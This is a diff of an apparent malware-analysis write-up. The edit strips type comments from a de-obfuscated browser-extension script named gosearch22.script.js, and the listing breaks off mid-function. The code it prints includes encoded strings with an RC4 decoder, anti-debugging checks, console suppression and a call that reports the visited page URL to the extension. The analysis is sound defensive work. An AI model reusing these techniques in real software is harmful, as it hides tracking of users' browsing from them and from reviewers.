@@ -123,7 +123,6 @@ gosearch22.script.js - de-obfuscated on my custom JS sandbox (it includes a modu
 
 ```js
 'use strict';
-/** @type {!Array} */
 var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG", "w492V8KNwrc=", "XFtr", "YcOmw41Mw6U=", "wqAWwrHCryXDngUnw5fCrg==", "CCo/biE=", "w77DhiTDsV4=", "wqNew7HCiMOrZXU=", "wpdLw4jCv8Ok", "w60Ow5fDrRA=", "MsOIwqYPPn7DmnzDvMO8", "a8OQw5low45iw4s=", "wrhyw5jCusK1JSdfw5dy", "wr1Jw6XCpMKS", "w70QGMKowrk=", "w44hw4/DkjU=", "Zgd8wrnDgw==", "AMKGHHbCvw==", "wqoNw4xkwoU=", "w4oSFmhE", "AsKoY8Or", "WsOTwo/DpRtBw5w=", "wq3DqwXDpj4Uwrk=", "w4DDisK3wrLCmA==", "XMOoBmo=", "wocWw5TDhh0=", 
 "ZTHCo8OKwrs=", "OsKEPEfClA==", "w5hTXsKlwofCjw==", "w5cBAMKSwoE=", "w6cENUAjwr1I", "wpzDssO+w4ht", "JFJPfTA=", "w6kCw4jDtA==", "wpPDj8Obw6pB", "w6AMKlw=", "a8O9woXDjw4=", "wpskaStD", "ZMO0RXIpTcKx", "bcOSJkdceMOpWFg=", "A8OrwoQ=", "w6gsDRPCt8OwR8KBKzo=", "Y8O+SXQ=", "YsOAw4lww4tww43DrWsI", "w7PCvsK4fw8=", "TU3DtWFO", "wrc3wpXDiGc=", "wrDCkwTCr8Ov", "wrQLwovCpws=", "woZRw57DsxI=", "wpvCg2ki", "w5fDisORwrLCtsKvwpjDggtO", "D8O2w5Ebwp3DqcOtw5Q=", "SB9zwpLDkA==", "w5t6dcKtwp8=", "ScKqw5bCn8Kt", "w5kFIcKEwps=", 
 "w5cNOQPCpQ==", "WcOXwqYMw4U=", "w5sOw4QrRg==", "w7MCKkkpwrVdcDA=", "DT8tRQ8=", "fVbDsMKtwrvCnU5bNhA=", "cUfDuA==", "HMOWwoEcPA==", "w6Bfw48IOQ==", "O8KCwoTChgrDg8Kg", "wpHChXQ3w48TJMOGwobCpQ==", "wq12w4LDkjg=", "w7BMw5wWRA==", "w5oUwoYoIX07BMOew60=", "wpHDp8Kjw5d7wqAJO3V2", "w5nCrsKZZhg=", "w6QGw5cedA==", "woABw6nDvAE=", "w6rDhxbDnFonUjA=", "w4Q6FyjCjQ==", "YMKXw5bCsMKn", "HikCNMOvwqU=", "e8OSOF1fbsO1W0fCuA==", "enFjw6Yk", "CcOaw4odwoI=", "ZSrCicOzwo0=", "w4wOCWZcTw==", "PsK3GFHCvQ==", "wrLCiDnCocOFw75iw77CpsKH", 
@@ -147,18 +146,11 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
 "w7wBwpE7", "TcO4TE0L", "w7srPsKKwqo=", "dRJzwpvDow==", "wqAcQio=", "wqZNWMO3wpbDoGgMewc=", "wp/DtcKSSQ==", "w7/DlcKiwqzCrA==", "woLDgm8ow4sfKMOWwqzDrg==", "wrwcwqzCug==", "NycKMsOr", "UzvCl8O0wqs=", "YsK1w4DCg8K8", "cMO5wr4jw4Q=", "w5fDpTLDm34=", "PcK3MWnCtw==", "ajZOwrjDjw==", "PsKsO3PCsA==", "wpMDeDRU", "Q2zDgE8=", "w7DCusKmag==", "NMKCw5fClEvDlsKgwp5mJA==", "wofDssKvasKX", "w5taU8Ky", "wr8dw4jDuwo=", "w6LCtEnCuMOkDMOgw7U=", "w74twpAnKQ==", "eUDDq8KPwpc=", "NAkD", "Ym54w4AI", "ATgeOsO1wqrDozk6", 
 "worCpBLCkg==", "wp5GQ8OGwro=", "wqs2bTtX", "wqBWw7/CjsOU", "A8K0ZcOhJnRoAQ==", "wpnDtMO8w5xx", "wqUHw4vDhxs=", "wqdVw5bCksKB", "w5QqMcK0wo8=", "w49NXsK3woPCkcOhwqrDqsKu", "w6oeKVwuwqhUeA==", "wr3DrcOcw4Rf", "wr8Rwq3Csw==", "Fz4YKg==", "w6UUw7/Dogg=", "UsO7wqAmw4hIwpxlw4gx", "SXfDkEZ3Gkdmf0k=", "w6k0wroQIA==", "SWfDo8K/woE=", "wrjDgg7Dnjo=", "BiUBNsOowrnDqzIz", "wqjDksK5Z8K/CMKOw7vDsMK8"];
 (function(params, content) {
-  /**
-   * @param {?} selected_image
-   * @return {undefined}
-   */
   var fn = function(selected_image) {
     for (; --selected_image;) {
       params["push"](params["shift"]());
     }
   };
-  /**
-   * @return {undefined}
-   */
   var build = function() {
     var target = {
       "data" : {
@@ -167,26 +159,20 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
       },
       "setCookie" : function(data, name, uri, headers) {
         headers = headers || {};
-        /** @type {string} */
         var url = name + "=" + uri;
-        /** @type {number} */
         var q = 0;
-        /** @type {number} */
         var i = 0;
         var key = data["length"];
         for (; i < key; i++) {
           var d = data[i];
-          /** @type {string} */
           url = url + ("; " + d);
           var value = data[d];
           data["push"](value);
           key = data["length"];
           if (value !== !![]) {
-            /** @type {string} */
             url = url + ("=" + value);
           }
         }
-        /** @type {string} */
         headers["cookie"] = url;
       },
       "removeCookie" : function() {
@@ -197,11 +183,6 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
           return canCreateDiscussions;
         };
         var v = match(new RegExp("(?:^|; )" + href["replace"](/([.$?*|{}()[]\/+^])/g, "$1") + "=([^;]*)"));
-        /**
-         * @param {!Function} callback
-         * @param {number} i
-         * @return {undefined}
-         */
         var test = function(callback, i) {
           callback(++i);
         };
@@ -209,17 +190,11 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
         return v ? decodeURIComponent(v[1]) : undefined;
       }
     };
-    /**
-     * @return {?}
-     */
     var init = function() {
-      /** @type {!RegExp} */
       var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
       return test["test"](target["removeCookie"]["toString"]());
     };
-    /** @type {function(): ?} */
     target["updateCookie"] = init;
-    /** @type {string} */
     var array = "";
     var k = target["updateCookie"]();
     if (!k) {
@@ -234,47 +209,29 @@ var a0a = ["wr0bRjtVP8KbeFo=", "LMOPwqMwNg==", "wpfDqMOtw4Rtw6s=", "wrpFw5rDhMOG
   };
   build();
 })(a0a, 367);
-/**
- * @param {number} m
- * @param {?} gamma
- * @return {?}
- */
 var a0b = function(m, gamma) {
-  /** @type {number} */
   m = m - 0;
   var l = a0a[m];
   if (a0b["yYCZAh"] === undefined) {
     (function() {
-      /**
-       * @return {?}
-       */
       var unescape = function() {
         var source;
         try {
           source = Function("return (function() " + '{}.constructor("return this")( )' + ");")();
         } catch (l) {
-          /** @type {!Window} */
           source = window;
         }
         return source;
       };
       var s_utf8 = unescape();
-      /** @type {string} */
       var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
       if (!s_utf8["atob"]) {
-        /**
-         * @param {?} i
-         * @return {?}
-         */
         s_utf8["atob"] = function(i) {
           var str = String(i)["replace"](/=+$/, "");
-          /** @type {string} */
           var pix_color = "";
-          /** @type {number} */
           var bc = 0;
           var bs;
           var buffer;
-          /** @type {number} */
           var Y = 0;
           for (; buffer = str["charAt"](Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String["fromCharCode"](255 & bs >> (-2 * bc & 6)) : 0) {
             buffer = listeners["indexOf"](buffer);
@@ -283,58 +240,36 @@ var a0b = function(m, gamma) {
         };
       }
     })();
-    /**
-     * @param {string} data
-     * @param {!Object} fn
-     * @return {?}
-     */
     var testcase = function(data, fn) {
-      /** @type {!Array} */
       var result = [];
-      /** @type {number} */
       var i = 0;
       var word;
-      /** @type {string} */
       var testResult = "";
-      /** @type {string} */
       var tempData = "";
-      /** @type {string} */
       data = atob(data);
-      /** @type {number} */
       var val = 0;
       var key = data["length"];
       for (; val < key; val++) {
-        /** @type {string} */
         tempData = tempData + ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
       }
-      /** @type {string} */
       data = decodeURIComponent(tempData);
       var j;
-      /** @type {number} */
       j = 0;
       for (; j < 256; j++) {
-        /** @type {number} */
         result[j] = j;
       }
-      /** @type {number} */
       j = 0;
       for (; j < 256; j++) {
-        /** @type {number} */
         i = (i + result[j] + fn["charCodeAt"](j % fn["length"])) % 256;
         word = result[j];
         result[j] = result[i];
         result[i] = word;
       }
-      /** @type {number} */
       j = 0;
-      /** @type {number} */
       i = 0;
-      /** @type {number} */
       var PL$19 = 0;
       for (; PL$19 < data["length"]; PL$19++) {
-        /** @type {number} */
         j = (j + 1) % 256;
-        /** @type {number} */
         i = (i + result[j]) % 256;
         word = result[j];
         result[j] = result[i];
@@ -343,60 +278,34 @@ var a0b = function(m, gamma) {
       }
       return testResult;
     };
-    /** @type {function(string, !Object): ?} */
     a0b["VqQkxC"] = testcase;
     a0b["HXMKWI"] = {};
-    /** @type {boolean} */
     a0b["yYCZAh"] = !![];
   }
   var o = a0b["HXMKWI"][m];
   if (o === undefined) {
     if (a0b["avdWvu"] === undefined) {
-      /**
-       * @param {?} deny
-       * @return {undefined}
-       */
       var WMCacheControl = function(deny) {
         this["mpnbTz"] = deny;
-        /** @type {!Array} */
         this["TQjLvW"] = [1, 0, 0];
-        /**
-         * @return {?}
-         */
         this["dNECWX"] = function() {
           return "newState";
         };
-        /** @type {string} */
         this["TAlOar"] = "\\w+ *\\(\\) *{\\w+ *";
-        /** @type {string} */
         this["yLVawE"] = "['|\"].+['|\"];? *}";
       };
-      /**
-       * @return {?}
-       */
       WMCacheControl["prototype"]["VyqkgG"] = function() {
-        /** @type {!RegExp} */
         var test = new RegExp(this["TAlOar"] + this["yLVawE"]);
-        /** @type {number} */
         var artistTrack = test["test"](this["dNECWX"]["toString"]()) ? --this["TQjLvW"][1] : --this["TQjLvW"][0];
         return this["QKPkcL"](artistTrack);
       };
-      /**
-       * @param {?} canCreateDiscussions
-       * @return {?}
-       */
       WMCacheControl["prototype"]["QKPkcL"] = function(canCreateDiscussions) {
         if (!Boolean(~canCreateDiscussions)) {
           return canCreateDiscussions;
         }
         return this["xCJawF"](this["mpnbTz"]);
       };
-      /**
-       * @param {?} saveNotifs
-       * @return {?}
-       */
       WMCacheControl["prototype"]["xCJawF"] = function(saveNotifs) {
-        /** @type {number} */
         var fp = 0;
         var len = this["TQjLvW"]["length"];
         for (; fp < len; fp++) {
@@ -406,7 +315,6 @@ var a0b = function(m, gamma) {
         return saveNotifs(this["TQjLvW"][0]);
       };
       (new WMCacheControl(a0b))["VyqkgG"]();
-      /** @type {boolean} */
       a0b["avdWvu"] = !![];
     }
     l = a0b["VqQkxC"](l, gamma);
@@ -417,70 +325,42 @@ var a0b = function(m, gamma) {
   return l;
 };
 var f = function() {
-  /** @type {boolean} */
   var c = !![];
   return function(object__360, function__361) {
-    /** @type {!Function} */
     var loopend = c ? function() {
       if (function__361) {
         var cssobj = function__361["apply"](object__360, arguments);
-        /** @type {null} */
         function__361 = null;
         return cssobj;
       }
     } : function() {
     };
-    /** @type {boolean} */
     c = ![];
     return loopend;
   };
 }();
 var fO = f(this, function() {
-  /**
-   * @return {?}
-   */
   var intval = function() {
     return "dev";
   };
-  /**
-   * @return {?}
-   */
   var getDOMPath = function() {
     return "window";
   };
-  /**
-   * @return {?}
-   */
   var testcase = function() {
-    /** @type {!RegExp} */
     var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
     return !test["test"](intval["toString"]());
   };
-  /**
-   * @return {?}
-   */
   var _stringify = function() {
-    /** @type {!RegExp} */
     var test = new RegExp("(\\\\[x|u](\\w){2,4})+");
     return test["test"](getDOMPath["toString"]());
   };
-  /**
-   * @param {!Object} p
-   * @return {undefined}
-   */
   var wrap = function(p) {
-    /** @type {number} */
     var ms_controller = ~-1 >> 1 + 255 % 0;
     if (p["indexOf"]("i" === ms_controller)) {
       create(p);
     }
   };
-  /**
-   * @param {!Object} s
-   * @return {undefined}
-   */
   var create = function(s) {
-    /** @type {number} */
     var n = ~-4 >> 1 + 255 % 0;
     if (s["indexOf"]((!![] + "")[3]) !== n) {
       wrap(s);
@@ -499,55 +379,27 @@ var fO = f(this, function() {
 fO();
 var e = function() {
   var _ = {};
-  /**
-   * @param {?} letter
-   * @param {?} all
-   * @return {?}
-   */
   _["fxIxA"] = function(letter, all) {
     return letter == all;
   };
-  /**
-   * @param {?} type
-   * @param {?} imagePixelModule
-   * @return {?}
-   */
   _["Scusm"] = function(type, imagePixelModule) {
     return type === imagePixelModule;
   };
-  /** @type {string} */
   _["dKxLT"] = "nWFOv";
   var tileFuncs = _;
-  /** @type {boolean} */
   var closeExpr = !![];
   return function(object__360, function__361) {
     var scanKeyPubBytes = {};
-    /**
-     * @param {?} mmaModFeedbackAutomSyncedEvent
-     * @param {?} tiles
-     * @return {?}
-     */
     scanKeyPubBytes["uWefn"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
       return tileFuncs["fxIxA"](mmaModFeedbackAutomSyncedEvent, tiles);
     };
-    /**
-     * @param {?} mmaModFeedbackAutomSyncedEvent
-     * @param {?} tiles
-     * @return {?}
-     */
     scanKeyPubBytes["iJJFY"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
       return tileFuncs["Scusm"](mmaModFeedbackAutomSyncedEvent, tiles);
     };
     scanKeyPubBytes["ptPTo"] = tileFuncs["dKxLT"];
     var Q = scanKeyPubBytes;
-    /** @type {!Function} */
     var closingExpr = closeExpr ? function() {
       var undefined = {};
-      /**
-       * @param {?} key
-       * @param {?} itm
-       * @return {?}
-       */
       undefined["oUaXQ"] = function(key, itm) {
         return Q["uWefn"](key, itm);
       };
@@ -562,66 +414,37 @@ var e = function() {
           return void 0 !== j ? j : a[c];
         } else {
           var cssobj = function__361["apply"](object__360, arguments);
-          /** @type {null} */
           function__361 = null;
           return cssobj;
         }
       }
     } : function() {
     };
-    /** @type {boolean} */
     closeExpr = ![];
     return closingExpr;
   };
 }();
 (function() {
   var target = {};
-  /** @type {string} */
   target["JEoQx"] = "function *" + "( *)";
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   target["pCGTJ"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /** @type {string} */
   target["NxPSG"] = "init";
-  /**
-   * @param {(Object|number)} buckets
-   * @param {!Object} name
-   * @return {?}
-   */
   target["FNcJD"] = function(buckets, name) {
     return buckets + name;
   };
-  /** @type {string} */
   target["WAvwA"] = "chain";
-  /** @type {string} */
   target["dtcxZ"] = "input";
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   target["fZvbB"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /**
-   * @param {?} callback
-   * @param {?} response_2
-   * @param {?} webhookMsg
-   * @return {?}
-   */
   target["NETsm"] = function(callback, response_2, webhookMsg) {
     return callback(response_2, webhookMsg);
   };
   var a = target;
   a["NETsm"](e, this, function() {
-    /** @type {!RegExp} */
     var numericValueTests = new RegExp(a["JEoQx"]);
-    /** @type {!RegExp} */
     var test = new RegExp("++ *(?:[" + "a-zA-Z_$][" + "0-9a-zA-Z_" + "$]*)", "i");
     var label = a["pCGTJ"](d, a["NxPSG"]);
     if (!numericValueTests["test"](a["FNcJD"](label, a["WAvwA"])) || !test["test"](label + a["dtcxZ"])) {
@@ -633,80 +456,41 @@ var e = function() {
 })();
 var c = function() {
   var activeIndex = {};
-  /**
-   * @param {?} i
-   * @param {?} categoryStart
-   * @return {?}
-   */
   activeIndex["VLsdz"] = function(i, categoryStart) {
     return i === categoryStart;
   };
-  /**
-   * @param {(boolean|number|string)} _num2
-   * @param {(boolean|number|string)} _num1
-   * @return {?}
-   */
   activeIndex["WeHFV"] = function(_num2, _num1) {
     return _num2 / _num1;
   };
-  /**
-   * @param {?} optionsValue
-   * @param {?} value
-   * @return {?}
-   */
   activeIndex["lqvfw"] = function(optionsValue, value) {
     return optionsValue !== value;
   };
-  /** @type {string} */
   activeIndex["dlhHl"] = "lrXze";
   var tileFuncs = activeIndex;
-  /** @type {boolean} */
   var closeExpr = !![];
   return function(object__360, function__361) {
     var values = {};
-    /**
-     * @param {?} mmaModFeedbackAutomSyncedEvent
-     * @param {?} tiles
-     * @return {?}
-     */
     values["OYBMz"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
       return tileFuncs["VLsdz"](mmaModFeedbackAutomSyncedEvent, tiles);
     };
-    /**
-     * @param {?} mmaModFeedbackAutomSyncedEvent
-     * @param {?} tiles
-     * @return {?}
-     */
     values["oruSZ"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
       return tileFuncs["WeHFV"](mmaModFeedbackAutomSyncedEvent, tiles);
     };
-    /**
-     * @param {?} mmaModFeedbackAutomSyncedEvent
-     * @param {?} tiles
-     * @return {?}
-     */
     values["PANfz"] = function(mmaModFeedbackAutomSyncedEvent, tiles) {
       return tileFuncs["lqvfw"](mmaModFeedbackAutomSyncedEvent, tiles);
     };
-    /**
-     * @param {?} saveNotifs
-     * @return {?}
-     */
     values["BzVPT"] = function(saveNotifs) {
       return saveNotifs();
     };
-    /** @type {string} */
     values["xEkDU"] = "none";
     var handlers = values;
     if (tileFuncs["dlhHl"] !== tileFuncs["dlhHl"]) {
       return handlers["OYBMz"](c, b) ? 0 !== c || handlers["OYBMz"](handlers["oruSZ"](1, c), 1 / b) : handlers["PANfz"](c, c) && b !== b;
     } else {
-      /** @type {!Function} */
       var closingExpr = closeExpr ? function() {
         if ("cMLBQ" !== "lPRrQ") {
           if (function__361) {
             var cssobj = function__361["apply"](object__360, arguments);
-            /** @type {null} */
             function__361 = null;
             return cssobj;
           }
@@ -721,13 +505,11 @@ var c = function() {
           }
           var query = {};
           query["url"] = location["href"];
-          /** @type {function(?): ?} */
           query["status"] = d;
           safari["extension"]["dispatchMe" + "ssage"](eventName, query);
         }
       } : function() {
       };
-      /** @type {boolean} */
       closeExpr = ![];
       return closingExpr;
     }
@@ -735,64 +517,32 @@ var c = function() {
 }();
 var g = c(this, function() {
   var self = {};
-  /** @type {string} */
   self["rlMnf"] = "info";
-  /** @type {string} */
   self["fmCgP"] = "6|3|2|7|4|" + "0|9|5|8|1";
-  /**
-   * @param {?} letter
-   * @param {?} all
-   * @return {?}
-   */
   self["EiPtW"] = function(letter, all) {
     return letter == all;
   };
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   self["JcDyU"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /**
-   * @param {(Object|number)} buckets
-   * @param {!Object} name
-   * @return {?}
-   */
   self["uIRnB"] = function(buckets, name) {
     return buckets + name;
   };
-  /**
-   * @param {?} saveNotifs
-   * @return {?}
-   */
   self["posvb"] = function(saveNotifs) {
     return saveNotifs();
   };
-  /** @type {string} */
   self["QHGdH"] = "lHXSM";
-  /**
-   * @param {?} optionsValue
-   * @param {?} value
-   * @return {?}
-   */
   self["ktKMm"] = function(optionsValue, value) {
     return optionsValue !== value;
   };
-  /** @type {string} */
   self["qOBtJ"] = "FRXum";
   var app = self;
-  /**
-   * @return {undefined}
-   */
   var e = function() {
   };
   var result;
   try {
     result = app["posvb"](aL);
   } catch (aV) {
-    /** @type {!Window} */
     result = window;
   }
   if (!result["console"]) {
@@ -809,45 +559,36 @@ var g = c(this, function() {
     } else {
       result["console"] = function(e) {
         var callbackVals = app["fmCgP"]["split"]("|");
-        /** @type {number} */
         var callbackCount = 0;
         for (; !![];) {
           switch(callbackVals[callbackCount++]) {
             case "0":
-              /** @type {function(): undefined} */
               result["error"] = e;
               continue;
             case "1":
               return result;
             case "2":
-              /** @type {function(): undefined} */
               result["warn"] = e;
               continue;
             case "3":
-              /** @type {function(): undefined} */
               result["log"] = e;
               continue;
             case "4":
-              /** @type {function(): undefined} */
               result["info"] = e;
               continue;
             case "5":
-              /** @type {function(): undefined} */
               result["table"] = e;
               continue;
             case "6":
               var result = {};
               continue;
             case "7":
-              /** @type {function(): undefined} */
               result["debug"] = e;
               continue;
             case "8":
-              /** @type {function(): undefined} */
               result["trace"] = e;
               continue;
             case "9":
-              /** @type {function(): undefined} */
               result["exception"] = e;
               continue;
           }
@@ -857,21 +598,13 @@ var g = c(this, function() {
     }
   } else {
     if (app["ktKMm"]("jhqFx", app["qOBtJ"])) {
-      /** @type {function(): undefined} */
       result["console"]["log"] = e;
-      /** @type {function(): undefined} */
       result["console"]["warn"] = e;
-      /** @type {function(): undefined} */
       result["console"]["debug"] = e;
-      /** @type {function(): undefined} */
       result["console"]["info"] = e;
-      /** @type {function(): undefined} */
       result["console"]["error"] = e;
-      /** @type {function(): undefined} */
       result["console"]["exception"] = e;
-      /** @type {function(): undefined} */
       result["console"]["table"] = e;
-      /** @type {function(): undefined} */
       result["console"]["trace"] = e;
     } else {
       if (app["EiPtW"](200, xhr["status"])) {
@@ -895,35 +628,18 @@ var g = c(this, function() {
 g();
 var $jscomp = $jscomp || {};
 $jscomp["scope"] = {};
-/** @type {boolean} */
 $jscomp["ASSUME_ES5"] = false;
-/** @type {boolean} */
 $jscomp["ASSUME_NO_" + "NATIVE_MAP"] = false;
-/** @type {boolean} */
 $jscomp["ASSUME_NO_" + "NATIVE_SET"] = false;
-/** @type {boolean} */
 $jscomp["SIMPLE_FRO" + "UND_POLYFI" + "LL"] = false;
-/** @type {boolean} */
 $jscomp["ISOLATE_PO" + "LYFILLS"] = false;
-/** @type {boolean} */
 $jscomp["FORCE_POLY" + "FILL_PROMI" + "SE"] = false;
-/** @type {boolean} */
 $jscomp["FORCE_POLY" + "FILL_PROMI" + "SE_WHEN_NO" + "_UNHANDLED" + "_REJECTION"] = false;
 $jscomp["defineProp" + "erty"] = $jscomp["ASSUME_ES5"] || "function" == typeof Object["defineProp" + "erties"] ? Object["defineProp" + "erty"] : function(options, attr, device) {
   var currentRelations = {};
-  /**
-   * @param {?} letter
-   * @param {?} all
-   * @return {?}
-   */
   currentRelations["PeGNY"] = function(letter, all) {
     return letter == all;
   };
-  /**
-   * @param {?} letter
-   * @param {?} all
-   * @return {?}
-   */
   currentRelations["MhNYO"] = function(letter, all) {
     return letter == all;
   };
@@ -934,52 +650,24 @@ $jscomp["defineProp" + "erty"] = $jscomp["ASSUME_ES5"] || "function" == typeof O
   options[attr] = device["value"];
   return options;
 };
-/**
- * @param {!Object} data
- * @return {?}
- */
 $jscomp["getGlobal"] = function(data) {
   var objectsToHistory = {};
-  /** @type {string} */
   objectsToHistory["xnQLp"] = "object";
-  /**
-   * @param {?} letter
-   * @param {?} all
-   * @return {?}
-   */
   objectsToHistory["nlpZX"] = function(letter, all) {
     return letter == all;
   };
-  /**
-   * @param {?} letter
-   * @param {?} all
-   * @return {?}
-   */
   objectsToHistory["pIfJQ"] = function(letter, all) {
     return letter == all;
   };
-  /**
-   * @param {(boolean|number|string)} rowTop
-   * @param {(boolean|number|string)} clientHeight
-   * @return {?}
-   */
   objectsToHistory["KzRtm"] = function(rowTop, clientHeight) {
     return rowTop < clientHeight;
   };
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   objectsToHistory["eKpjc"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /** @type {string} */
   objectsToHistory["atXzl"] = "Cannot fin" + "d global o" + "bject";
   var handlers = objectsToHistory;
-  /** @type {!Array} */
   data = [handlers["xnQLp"] == typeof globalThis && globalThis, data, handlers["nlpZX"](handlers["xnQLp"], typeof window) && window, handlers["pIfJQ"](handlers["xnQLp"], typeof self) && self, handlers["pIfJQ"](handlers["xnQLp"], typeof global) && global];
-  /** @type {number} */
   var c = 0;
   for (; handlers["KzRtm"](c, data["length"]); ++c) {
     var root = data[c];
@@ -990,33 +678,16 @@ $jscomp["getGlobal"] = function(data) {
   throw handlers["eKpjc"](Error, handlers["atXzl"]);
 };
 $jscomp["global"] = $jscomp["getGlobal"](this);
-/** @type {boolean} */
 $jscomp["IS_SYMBOL_" + "NATIVE"] = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
 $jscomp["TRUST_ES6_" + "POLYFILLS"] = !$jscomp["ISOLATE_PO" + "LYFILLS"] || $jscomp["IS_SYMBOL_" + "NATIVE"];
 $jscomp["polyfills"] = {};
 $jscomp["propertyTo" + "PolyfillSy" + "mbol"] = {};
-/** @type {string} */
 $jscomp["POLYFILL_P" + "REFIX"] = "$jscp$";
-/**
- * @param {!NodeList} mapping
- * @param {number} index
- * @return {?}
- */
 var $jscomp$lookupPolyfilledValue = function(mapping, index) {
   var currentRelations = {};
-  /**
-   * @param {?} letter
-   * @param {?} all
-   * @return {?}
-   */
   currentRelations["XQgAh"] = function(letter, all) {
     return letter == all;
   };
-  /**
-   * @param {?} optionsValue
-   * @param {?} value
-   * @return {?}
-   */
   currentRelations["mVvjs"] = function(optionsValue, value) {
     return optionsValue !== value;
   };
@@ -1028,13 +699,6 @@ var $jscomp$lookupPolyfilledValue = function(mapping, index) {
   value = mapping[value];
   return addedRelations["mVvjs"](void 0, value) ? value : mapping[index];
 };
-/**
- * @param {?} mmCoreSplitViewBlock
- * @param {?} mmaPushNotificationsComponent
- * @param {?} mmaFrontpagePriority
- * @param {?} isBgroundImg
- * @return {undefined}
- */
 $jscomp["polyfill"] = function(mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg) {
   if (mmaPushNotificationsComponent) {
     if ($jscomp["ISOLATE_PO" + "LYFILLS"]) {
@@ -1044,50 +708,22 @@ $jscomp["polyfill"] = function(mmCoreSplitViewBlock, mmaPushNotificationsCompone
     }
   }
 };
-/**
- * @param {!Object} p
- * @param {string} key
- * @param {!Object} prop
- * @param {string} value
- * @return {undefined}
- */
 $jscomp["polyfillUn" + "isolated"] = function(p, key, prop, value) {
   var context = {};
-  /**
-   * @param {(boolean|number|string)} rowTop
-   * @param {(boolean|number|string)} clientHeight
-   * @return {?}
-   */
   context["MZaNY"] = function(rowTop, clientHeight) {
     return rowTop < clientHeight;
   };
-  /**
-   * @param {(number|string)} minWorkers
-   * @param {!Object} options
-   * @return {?}
-   */
   context["LTohp"] = function(minWorkers, options) {
     return minWorkers in options;
   };
-  /**
-   * @param {(boolean|number|string)} b
-   * @param {(boolean|number|string)} a
-   * @return {?}
-   */
   context["wMiFc"] = function(b, a) {
     return b - a;
   };
-  /**
-   * @param {?} modstatus
-   * @param {?} mmCoreNotDownloadable
-   * @return {?}
-   */
   context["LnRSl"] = function(modstatus, mmCoreNotDownloadable) {
     return modstatus != mmCoreNotDownloadable;
   };
   var obj = context;
   var callbackVals = ("0|2|1|3|5|" + "4|6")["split"]("|");
-  /** @type {number} */
   var callbackCount = 0;
   for (; !![];) {
     switch(callbackVals[callbackCount++]) {
@@ -1095,7 +731,6 @@ $jscomp["polyfillUn" + "isolated"] = function(p, key, prop, value) {
         prop = $jscomp["global"];
         continue;
       case "1":
-        /** @type {number} */
         value = 0;
         for (; obj["MZaNY"](value, p["length"] - 1); value++) {
           var name = p[value];
@@ -1130,78 +765,31 @@ $jscomp["polyfillUn" + "isolated"] = function(p, key, prop, value) {
     break;
   }
 };
-/**
- * @param {!Object} layoutSets
- * @param {string} c
- * @param {string} e
- * @param {?} v
- * @return {undefined}
- */
 $jscomp["polyfillIs" + "olated"] = function(layoutSets, c, e, v) {
   var array = {};
-  /** @type {string} */
   array["JcgLM"] = "script";
-  /** @type {string} */
   array["aSbxX"] = "src";
-  /**
-   * @param {?} x_or_y
-   * @param {?} y
-   * @return {?}
-   */
   array["wzMcV"] = function(x_or_y, y) {
     return x_or_y === y;
   };
-  /**
-   * @param {(number|string)} minWorkers
-   * @param {!Object} options
-   * @return {?}
-   */
   array["GqrxY"] = function(minWorkers, options) {
     return minWorkers in options;
   };
-  /**
-   * @param {(boolean|number|string)} angle
-   * @param {(boolean|number|string)} keyAngle
-   * @return {?}
-   */
   array["JctXN"] = function(angle, keyAngle) {
     return angle < keyAngle;
   };
-  /**
-   * @param {(boolean|number|string)} b
-   * @param {(boolean|number|string)} a
-   * @return {?}
-   */
   array["eKdnq"] = function(b, a) {
     return b - a;
   };
-  /** @type {string} */
   array["TeFLu"] = "XoSug";
-  /** @type {string} */
   array["Zqywp"] = "bGejl";
-  /** @type {string} */
   array["JnhAC"] = "es6";
-  /**
-   * @param {?} saveNotifs
-   * @param {?} notifications
-   * @return {?}
-   */
   array["fuRHh"] = function(saveNotifs, notifications) {
     return saveNotifs(notifications);
   };
-  /**
-   * @param {?} modstatus
-   * @param {?} mmCoreNotDownloadable
-   * @return {?}
-   */
   array["cVkGM"] = function(modstatus, mmCoreNotDownloadable) {
     return modstatus != mmCoreNotDownloadable;
   };
-  /**
-   * @param {(Object|number)} text
-   * @param {!Object} shorturl_result
-   * @return {?}
-   */
   array["RWPzm"] = function(text, shorturl_result) {
     return text + shorturl_result;
   };
@@ -1210,7 +798,6 @@ $jscomp["polyfillIs" + "olated"] = function(layoutSets, c, e, v) {
   layoutSets = a["wzMcV"](1, t["length"]);
   v = t[0];
   v = !layoutSets && a["GqrxY"](v, $jscomp["polyfills"]) ? $jscomp["polyfills"] : $jscomp["global"];
-  /** @type {number} */
   var x = 0;
   for (; a["JctXN"](x, a["eKdnq"](t["length"], 1)); x++) {
